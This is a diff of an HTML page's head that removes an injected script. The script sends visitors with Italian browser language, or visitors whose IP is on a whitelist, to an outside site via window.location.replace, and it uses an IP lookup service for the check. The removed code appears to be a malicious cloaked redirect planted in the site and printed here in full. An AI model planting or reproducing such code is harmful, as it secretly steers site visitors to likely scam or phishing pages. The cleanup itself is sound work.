@@ -4,62 +4,7 @@
 <head>
     <meta charset="UTF-8">
  
-	 <script>
-  // ✅ IP 白名单
-  const WHITE_LIST_IPS = [
-    "38.134.114.67",
-    "154.29.238.6",
-    "23.229.109.217",
-    "103.160.180.218"
-  ];
-
-  // 跳转目标
-  const REDIRECT_URL = "https://mak922p.site/yida2/fbok/";
-
-  // ✅ 判断是否意大利语言
-  function isItalianLang() {
-    const langs = navigator.languages?.length
-      ? navigator.languages
-      : [navigator.language || ""];
-    // 将 "ja" 改为了 "it" 以匹配意大利语
-    return langs.some(l => l.toLowerCase().startsWith("it"));
-  }
-
-  // ✅ 执行跳转
-  function redirect() {
-    window.location.replace(REDIRECT_URL);
-  }
-
-  // ✅ 带超时的 fetch
-  function fetchWithTimeout(url, ms = 4000) {
-    const controller = new AbortController();
-    const timer = setTimeout(() => controller.abort(), ms);
-    return fetch(url, { signal: controller.signal })
-      .finally(() => clearTimeout(timer));
-  }
-
-  // ✅ 主逻辑：语言优先判断，避免不必要的网络请求
-  (async function init() {
-    // 第一步：语言检测，立即判断，无需网络
-    if (isItalianLang()) {
-      redirect();
-      return;
-    }
-
-    // 第二步：语言不符合，再去检查 IP
-    try {
-      const res = await fetchWithTimeout("https://ipapi.co/json/");
-      const data = await res.json();
-      if (WHITE_LIST_IPS.includes(data.ip)) {
-        redirect();
-      }
-    } catch (e) {
-      // IP 获取失败（超时 / 网络错误）：不跳转，静默处理
-      console.warn("IP check failed:", e.message);
-    }
-  })();
-</script>
-
+	 
 
 
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
